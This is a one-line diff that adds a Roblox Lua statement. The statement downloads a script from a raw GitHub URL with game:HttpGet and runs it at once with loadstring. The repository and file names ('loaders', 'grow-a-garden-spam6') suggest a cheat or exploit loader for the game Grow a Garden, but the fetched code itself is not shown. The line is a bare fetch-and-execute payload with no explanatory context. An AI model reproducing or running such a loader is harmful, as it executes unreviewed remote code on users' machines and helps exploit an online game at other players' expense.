@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/grow-a-garden-spam6-vuq98447o9c1g2.lua"))()
